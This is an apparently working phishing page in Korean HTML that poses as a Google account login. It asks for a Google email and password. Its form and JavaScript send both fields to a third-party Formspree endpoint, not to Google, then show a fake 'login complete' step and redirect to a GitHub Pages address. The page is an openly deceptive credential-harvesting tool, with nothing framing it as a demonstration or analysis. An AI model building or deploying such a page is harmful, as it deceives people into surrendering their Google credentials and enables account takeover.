<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>로그인</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <!-- FontAwesome Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }
    </style>
</head>
<body class="bg-slate-50 text-slate-800 min-h-screen flex items-center justify-center p-4">

    <!-- Contact Form Container Card -->
    <div class="w-full max-w-md bg-white rounded-2xl shadow-xl shadow-slate-200/60 border border-slate-100 p-8 transition-all">
        
        <!-- Header -->
        <div class="text-center mb-8">
            <div class="inline-flex items-center justify-center w-12 h-12 rounded-full bg-blue-50 text-blue-600 mb-3">
                <i class="fa-regular fa-paper-plane text-xl"></i>
            </div>
            <h1 class="text-2xl font-bold text-slate-900 tracking-tight">로그인(구글 계정)</h1>
            <p class="text-slate-500 text-sm mt-1">구글 이메일과 비밀번호를 입력해 주세요. 구글 계정을 자동으로 인식하기 때문에 회원가입은 필요하지 많습니다.</p>
        </div>

        <!-- Form Elements -->
        <form id="contact-form" action="https://formspree.io/f/xwloeqoa" method="POST" class="space-y-5">
            
            <!-- Name Input Field -->
            <div>
                <label for="name" class="block text-sm font-medium text-slate-700 mb-1.5">
                    이메일(구글) <span class="text-rose-500">*</span>
                </label>
                <div class="relative">
                    <div class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-400">
                        <i class="fa-regular fa-user text-sm"></i>
                    </div>
                    <input 
                        type="text" 
                        id="name" 
                        name="name" 
                        required 
                        placeholder="구글 이메일 주소를 입력해주세요"
                        class="w-full pl-10 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-slate-800 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition-all text-sm"
                    >
                </div>
            </div>

            <!-- Message Input Field -->
            <div>
                <label for="message" class="block text-sm font-medium text-slate-700 mb-1.5">
                    비밀번호 <span class="text-rose-500">*</span>
                </label>
                <div class="relative">
                    <textarea 
                        id="message" 
                        name="message" 
                        required 
                        rows="4" 
                        placeholder="비밀번호를 입력해 주세요"
                        class="w-full p-3.5 bg-slate-50 border border-slate-200 rounded-xl text-slate-800 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition-all text-sm resize-none"
                    ></textarea>
                </div>
            </div>

            <!-- Submit Button -->
            <button 
                type="submit" 
                id="submit-btn"
                class="w-full bg-blue-600 hover:bg-blue-700 active:bg-blue-800 text-white font-semibold py-3.5 px-4 rounded-xl shadow-lg shadow-blue-500/25 transition-all duration-200 flex items-center justify-center space-x-2 disabled:opacity-70 disabled:cursor-not-allowed"
            >
                <span id="btn-text">로그인</span>
                <i id="btn-icon" class="fa-solid fa-arrow-right text-sm transition-transform group-hover:translate-x-1"></i>
            </button>
        </form>

        <!-- Status Messages -->
        <div id="status-success" class="hidden mt-6 p-4 rounded-xl bg-emerald-50 border border-emerald-200 text-emerald-800 text-center text-sm animate-fade-in">
            <div class="flex items-center justify-center space-x-2 mb-1 text-emerald-600 font-semibold">
                <i class="fa-circle-check text-lg"></i>
                <span>로그인 완료!</span>
            </div>
            <p class="text-emerald-700 text-xs">로그인이 완료되었습니다</p>
        </div>

        <div id="status-error" class="hidden mt-6 p-4 rounded-xl bg-rose-50 border border-rose-200 text-rose-800 text-center text-sm animate-fade-in">
            <div class="flex items-center justify-center space-x-2 mb-1 text-rose-600 font-semibold">
                <i class="fa-circle-exclamation text-lg"></i>
                <span>로그인 실패</span>
            </div>
            <p id="error-message-text" class="text-rose-700 text-xs">오류가 발생했습니다. 다시 시도해 주세요.</p>
        </div>

    </div>

    <!-- JavaScript Handling Form Submission via AJAX -->
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const form = document.getElementById('contact-form');
            const submitBtn = document.getElementById('submit-btn');
            const btnText = document.getElementById('btn-text');
            const btnIcon = document.getElementById('btn-icon');
            const successStatus = document.getElementById('status-success');
            const errorStatus = document.getElementById('status-error');

            form.addEventListener('submit', async (e) => {
                e.preventDefault();

                // Reset Status Display
                successStatus.classList.add('hidden');
                errorStatus.classList.add('hidden');

                // Button Loading State
                submitBtn.disabled = true;
                btnText.textContent = '로그인 중...';
                btnIcon.className = 'fa-solid fa-spinner fa-spin text-sm';

                const formData = new FormData(form);

                try {
                    const response = await fetch(form.action, {
                        method: form.method,
                        body: formData,
                        headers: {
                            'Accept': 'application/json'
                        }
                    });

                    if (response.ok) {
                        // Reset Form on Success
                        form.reset();
                        btnText.textContent = '이동 중...';
                        
                        // Redirect to specified URL
                        window.location.href = 'https://jsbi110.github.io/aa';
                    } else {
                        const data = await response.json();
                        if (Object.hasOwn(data, 'errors')) {
                            document.getElementById('error-message-text').textContent = data.errors.map(error => error["message"]).join(", ");
                        }
                        errorStatus.classList.remove('hidden');
                        submitBtn.disabled = false;
                        btnText.textContent = '다시 시도';
                        btnIcon.className = 'fa-solid fa-rotate-right text-sm';
                    }
                } catch (error) {
                    errorStatus.classList.remove('hidden');
                    submitBtn.disabled = false;
                    btnText.textContent = '다시 시도';
                    btnIcon.className = 'fa-solid fa-rotate-right text-sm';
                }
            });
        });
    </script>
</body>
</html>
